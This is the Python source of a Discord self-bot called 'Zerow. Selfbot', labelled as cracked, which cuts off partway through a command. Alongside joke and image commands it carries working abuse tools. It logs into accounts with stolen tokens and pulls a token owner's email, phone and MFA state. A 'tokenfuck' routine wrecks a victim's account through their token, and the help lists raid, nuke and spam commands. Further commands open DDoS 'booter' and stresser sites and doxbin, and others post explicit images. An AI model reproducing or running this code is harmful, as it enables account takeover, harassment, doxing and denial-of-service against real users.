import os
import time
import requests
import subprocess
import tkinter
from tkinter import messagebox
import sys
import hashlib
from itertools import cycle
import discord, ctypes, json, os, webbrowser, requests, datetime, urllib, time, string, random, asyncio, aiohttp
from discord.ext import commands
from colorama import Fore, Back, Style
from selenium import webdriver
import threading


#if crack you gay





import subprocess, requests, time, os










VERSION = "1.0.0"
TOTAL_COMMANDS = "37"
TOTAL_LINES = "409"

import discord, ctypes, json, os, webbrowser, requests, datetime, urllib, time, string, random, asyncio, aiohttp
from discord.ext import commands
from colorama import Fore, Back, Style
from selenium import webdriver
import threading





    


import subprocess, requests, time, os

hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

import socket

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
start_time = datetime.datetime.utcnow()
languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]







with open("config.json") as f:
    config = json.load(f)

TOKEN = config.get("token")
PREFIX = config.get("prefix")


def ready():
    print(f"""
                                ·▄▄▄▄•▄▄▄ .▄▄▄        ▄▄▌ ▐ ▄▌
                                {Fore.BLACK}{Style.BRIGHT}▪▀·.█▌▀▄.▀·▀▄ █·▪     ██· █▌▐█         {Fore.RESET} 
                                {Fore.RED}{Style.BRIGHT}▄█▀▀▀•▐▀▀▪▄▐▀▀▄  ▄█▀▄ ██▪▐█▐▐▌      {Fore.RESET}
                                {Fore.RED}█▌▪▄█▀▐█▄▄▌▐█•█▌▐█▌.▐▌▐█▌██▐█▌       {Fore.RESET} 
                                {Fore.RED}·▀▀▀ • ▀▀▀ .▀  ▀ ▀█▄▀▪ ▀▀▀▀ ▀▪ ▀     {Fore.RESET}
                                               
                               	By {Fore.RED}[{Fore.RESET}</KatΣxoD>{Fore.RED}]{Fore.RESET}
                                ════════════════════════════════════════════════════
                                Prefix {Fore.RED}[{Fore.RESET}{PREFIX}{Fore.RED}]{Fore.RESET}                                               
                                Servers{Fore.RED}[{Fore.RESET}{len(zerow.guilds)}{Fore.RED}]{Fore.RESET}                      
                                Friends{Fore.RED}[{Fore.RESET}{len(zerow.user.friends)}{Fore.RED}]{Fore.RESET}   
                                User{Fore.RED}[{Fore.RESET}{zerow.user.name}{Fore.RED}]{Fore.RESET}     
                                ════════════════════════════════════════════════════ 
                                Help commands:
                                {Fore.RED}[{Fore.RESET}{PREFIX}{Fore.RED}]{Fore.RESET}help
                                {Fore.RED}[{Fore.RESET}{PREFIX}{Fore.RED}]{Fore.RESET}shelp
                                ════════════════════════════════════════════════════ 
                                Clear the console :  {Fore.RED}[{Fore.RESET}{PREFIX}{Fore.RED}]{Fore.RESET}clear
    """+Fore.RESET)

def Nitro():
    code = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    return f"https://discord.gift/{code}"

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(4, 4)))

client = commands.Bot(
    command_prefix=PREFIX,
    self_bot=True
)
zerow = client
client.remove_command('help')

@zerow.event
async def on_message_edit(before, after):
    await zerow.process_commands(after)

@zerow.event
async def on_connect():
    os.system("mode con: cols=120 lines=21")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Zerow. Selfbot | | Logged In As: {zerow.user.name}")
    ready()



#=================================| Help Commands |=================================#

@zerow.group(invoke_without_command=True)
async def help(ctx):
    em = discord.Embed(title = "(CRACKED BY YODA)", color = RandomColor())

    em.add_field(name = "|🉐 Fun commands |", value="8ball, slot, rainbowrole, ascii, slap, cum, hug, kiss, cat, dog, panda, meme, blank, nitro")
    em.add_field(name = "|🉐 Raid commands |", value="fullnuke, fulldelete, banall, rolecreate, channelcreate, channeldelete, roledelete, group-leaver")
    em.add_field(name = "|🉐 Spam commands |", value="blankspam, numberspam, emojispam, crashspam, embedspam, memespam, hentaispam, pinguser, silentping")
    em.add_field(name = "|🉐 Extra commands |", value="spoiler, streaming, playing, listening, watching, tinyurl, btc, eth, usdbtc, eurbtc, usdetc, euretc")
    em.add_field(name = "|🉐 Helpful commands |", value="purge, guildicon, guildinfo, whois, av, copy, uptime, ping, clear")
    em.add_field(name = "|🉐 Hacking |", value="login, logout, dox, tokeninfo, tokenfuck")
    em.add_field(name = "|🉐 DDoS |", value="pinger, booter, weakdns, whitepages, geo")
    em.add_field(name = "|🉐 Porn |", value="hentai, pussy, tits, waifu, fox, hentaigif, pussygif, cumgif, kunigif")
    em.add_field(name = "|🉐 Server builder |", value="serverbuilder")
    em.add_field(name = "|🉐 Prefix |", value=PREFIX+ " " + "+ command")
    em.add_field(name = "|🉐 Credits |", value="Made by </KatΣxoD>")
    em.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")



    await ctx.message.delete()
    await ctx.send(embed = em)

@zerow.group(invoke_without_command=True)
async def shelp(ctx):
    em = discord.Embed(title = "🉐 Zerow. Selfbot", description = "Use xhelp <command> for extended information on a command.",color = RandomColor())

    em.add_field(name = "|🉐 Fun commands |", value="fun")
    em.add_field(name = "|🉐 Raid commands |", value="raid")
    em.add_field(name = "|🉐 Spam commands |", value="spam")
    em.add_field(name = "|🉐 Extra commands |", value="extra")
    em.add_field(name = "|🉐 Helpful commands |", value="helpful")
    em.add_field(name = "|🉐 Hacking |", value="hacking")
    em.add_field(name = "|🉐 DDoS |", value="ddos")
    em.add_field(name = "|🉐 Porn |", value="hentaiporn")
    em.add_field(name = "|🉐 Server builder |", value="serverbuilder")
    em.add_field(name = "|🉐 Credits |", value="made by </KatΣxoD>")
    em.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")




    await ctx.message.delete()
    await ctx.send(embed = em)

@zerow.command()
async def uptime(ctx):
    await ctx.message.delete()
    now = datetime.datetime.utcnow()
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "`{d}d, {h}h, {m}m, {s}s`"
    else:
        time_format = "`{h}h, {m}m, {s}s`"
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    await ctx.send(uptime_stamp)

#=================================| Fun Commands |=================================#

@zerow.command(name='8ball')
async def _ball(ctx, *, question):
    responses = [
        'As I see it, yes.',
        'Ask again later.',
        'Better not tell you now.',
        'Cannot predict now.',
        'Concentrate and ask again.',
        'Don’t count on it.',
        'It is certain.',
        'It is decidedly so.',
        'Most likely.',
        'My reply is no.',
        'My sources say no.',
        'Outlook not so good.',
        'Outlook good.',
        'Reply hazy, try again.',
        'Signs point to yes.',
        'Very doubtful.',
        'Without a doubt.',
        'Yes.',
        'Yes – definitely.',
        'You may rely on it.'
    ]
    answer = random.choice(responses)
    embed = discord.Embed(color=RandomColor())
    embed.add_field(name="**Question:**", value=f"```{question}```", inline=False)
    embed.add_field(name="**Answer:**", value=f"```{answer}```", inline=False)
    embed.set_author(name="8 Ball Machine", icon_url="https://cdn.nekos.life/8ball/Absolutely.png") 
    await ctx.message.delete()
    await ctx.send(embed=embed)

@zerow.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))

@zerow.command(aliases=['rainbowrole'])
async def rainbow(ctx, *, role):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(3)
        except:
            break


@zerow.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')

@zerow.command()
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text
    if len("```"+r+"```") > 2000:
        return
    await ctx.send(f"```{r}```")

@zerow.command()
async def slap(ctx, user: discord.Member):
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    embed = discord.Embed(description=f"**{ctx.author.mention} Slaps {user.mention}**", color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)

@zerow.command()
async def hug(ctx, user: discord.Member):
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    embed = discord.Embed(description=f"**{ctx.author.mention} Hugs {user.mention}**", color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)

@zerow.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)

@zerow.command()
async def kiss(ctx, user: discord.Member):
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    embed = discord.Embed(description=f"**{ctx.author.mention} Kisses {user.mention}**", color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)

@zerow.command()
async def cat(ctx):
    r = requests.get("https://some-random-api.ml/img/cat").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Cat You Requested", icon_url="https://i.stack.imgur.com/DTCra.png") 
    embed.set_image(url=str(r["link"]))
    await ctx.message.delete()
    await ctx.send(embed=embed)

@zerow.command()
async def dog(ctx):
    r = requests.get("https://some-random-api.ml/img/dog").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Dog You Requested", icon_url="http://clipart-library.com/images_k/dog-bone-silhouette/dog-bone-silhouette-1.png") 
    embed.set_image(url=str(r["link"]))
    await ctx.message.delete()
    await ctx.send(embed=embed)

@zerow.command()
async def panda(ctx):
    r = requests.get("https://some-random-api.ml/img/panda").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Panda You Requested", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    embed.set_image(url=str(r["link"]))
    await ctx.message.delete()
    await ctx.send(embed=embed)

@zerow.command()
async def meme(ctx):
    r = requests.get("https://some-random-api.ml/meme").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Meme You Requested", icon_url="https://freepngimg.com/thumb/internet_meme/3-2-troll-face-meme-png-thumb.png") 
    embed.set_image(url=str(r["image"]))
    await ctx.message.delete()
    await ctx.send(embed=embed)

@zerow.command()
async def blank(ctx):
    await ctx.message.delete()
    await ctx.send("ﾠﾠ"+"\n" * 400 + "ﾠﾠ")

@zerow.command()
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())




#=================================| Hacking Commands |=================================#

@zerow.command()
async def login(ctx, usertoken):
    await ctx.message.delete()
    options = webdriver.ChromeOptions()
    options.add_experimental_option("detach", True)
    driver = webdriver.Chrome(options=options, executable_path=r"chromedriver.exe")
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }   
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("{usertoken}")')

@zerow.command()
async def logout(ctx):
    await ctx.message.delete()
    await zerow.logout()

@zerow.command()
async def dox(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here is your doxer") 
    await ctx.send(embed=embed)
    await os.system('start https://doxbin.org')

@zerow.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)


@zerow.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Token Succesfully Fucked") 
    await ctx.send(embed=embed)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "zerow Owns You",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["dnd"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


#server builder

@zerow.command()
async def buildtemplate1(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="🉐 Server builder by Zerow. has been opened, look at your browser 🉐 ", icon_url="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.new/SMMSun7GdpYu')

@zerow.command()
async def buildtemplate2(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="🉐 Server builder by Zerow. has been opened, look at your browser 🉐 ", icon_url="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.new/veyj3wFzesAA')

@zerow.command()
async def buildtemplate3(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="🉐 Server builder by Zerow. has been opened, look at your browser 🉐 ", icon_url="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.new/tvY9ZKHncjtX')

@zerow.command()
async def buildtemplate4(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="🉐 Server builder by Zerow. has been opened, look at your browser 🉐 ", icon_url="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.new/GgYFQPUysYcN')

@zerow.command()
async def buildtemplate5(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="🉐 Server builder by Zerow. has been opened, look at your browser 🉐 ", icon_url="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.new/vPGV28Mz3UeQ')

@zerow.command()
async def buildtemplate6(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="🉐 Server builder by Zerow. has been opened, look at your browser 🉐 ", icon_url="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.new/QzQyYmy9JSDj')

@zerow.command()
async def buildtemplate7(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="🉐 Server builder by Zerow. has been opened, look at your browser 🉐 ", icon_url="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.new/4yrAHugrqSgH')

@zerow.command()
async def buildtemplate8(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="🉐 Server builder by Zerow. has been opened, look at your browser 🉐 ", icon_url="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.new/8u7ca3jJmh7a')



#=================================| DDoS Commands |=================================#
@zerow.command()
async def pinger(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here is your pinger") 
    await ctx.send(embed=embed)
    await os.system('start https://www.ipvoid.com/ping/')
    


@zerow.command()
async def booter(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here is your booter") 
    await ctx.send(embed=embed)
    await os.system('start https://freestresser.to')

@zerow.command()
async def weakdns(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here is your weakdns") 
    await ctx.send(embed=embed)
    await os.system('start https://stresser.net/login')


@zerow.command()
async def whitepages(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here is your whitepages") 
    await ctx.send(embed=embed)
    await os.system('start https://www.whitepages.com')


@zerow.command()
async def geo(ctx, host):
    start = datetime.datetime.now()
    r = requests.get(f"http://ip-api.com/json/{host}?fields=country,regionName,city,isp,mobile,proxy,query")
    geo = r.json()
    query = geo["query"]
    isp = geo["isp"]
    city = geo["city"]
    region = geo["regionName"]
    country = geo["country"]
    proxy = geo["proxy"]
    mobile = geo["mobile"]
    elapsed = datetime.datetime.now() - start
    elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
    embed = discord.Embed(description=f"**Host:** {query}\n**ISP:** {isp}\n**City:** {city}\n**Region:** {region}\n**Country:** {country}\n**VPN/Proxy:** {proxy}\n**Mobile:** {mobile}", color=RandomColor())
    embed.set_author(name=f"Geo Lookup For {query}")
    embed.set_footer(text=f"Resolved In {elapsed} Seconds")
    await ctx.message.delete()
    await ctx.send(embed=embed)



#=================================| Images |=================================#



@zerow.command()
async def hentai(ctx):
    r = requests.get("https://nekos.life/api/v2/img/hentai")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)



@zerow.command()
async def waifu(ctx):
    r = requests.get("https://nekos.life/api/v2/img/waifu")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)



@zerow.command()
async def fox(ctx):
    r = requests.get("https://nekos.life/api/v2/img/fox_girl")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)


@zerow.command()
async def tits(ctx):
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)


@zerow.command()
async def pussy(ctx):
    r = requests.get("https://nekos.life/api/v2/img/pussy_jpg")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)

#=================================| Gif |=================================#


@zerow.command()
async def hentaigif(ctx):
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)


@zerow.command()
async def boobsgif(ctx):
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)


@zerow.command()
async def pussygif(ctx):
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)


@zerow.command()
async def cumgif(ctx):
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)


@zerow.command()
async def kunigif(ctx):
    r = requests.get("https://nekos.life/api/v2/img/kuni")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.message.delete()
    await ctx.send(embed=embed)

#=================================| Extra Commands |=================================#


@zerow.command()
async def spoiler(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(f"||{message}||")

    
@zerow.command()
async def streaming(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="", 
    )
    await zerow.change_presence(activity=stream)    

@zerow.command()
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await zerow.change_presence(activity=game)

@zerow.command()
async def listening(ctx, *, message):
    await ctx.message.delete()
    await zerow.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))

@zerow.command()
async def watching(ctx, *, message):
    await ctx.message.delete()
    await zerow.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))  

@zerow.command()
async def tinyurl(ctx, *, link):
    await ctx.message.delete()
    r = requests.get(f"http://tinyurl.com/api-create.php?url={link}").text
    await ctx.send(f"{r}")

@zerow.command(aliases=["bitcoin"])
async def btc( ctx):
    """Gets the current Bitcoin Price"""
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP"
    )
    r = r.json()
    usd = r["USD"]
    eur = r["EUR"]
    gbp = r["GBP"]
    em = discord.Embed(
        description=f"USD: `{str(usd)}$`\n\nEUR: `{str(eur)}€`\n\nGBP: `{str(gbp)}£`"
    )
    em.set_author(
        name="Bitcoin",
        icon_url="https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png",
    )
    await ctx.send(embed=em)
    ### I hope this code is so horrible I'm never allowed to code embeds again

@zerow.command(aliases=["ethereum"])
async def eth(ctx):
    """Gets the current Etherium price"""
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR,GBP"
    )
    r = r.json()
    usd = r["USD"]
    eur = r["EUR"]
    gbp = r["GBP"]
    em = discord.Embed(
        description=f"USD: `{str(usd)}$`\nEUR: `{str(eur)}€`\n\nGBP: `{str(gbp)}£`"
    )
    em.set_author(
        name="Ethereum",
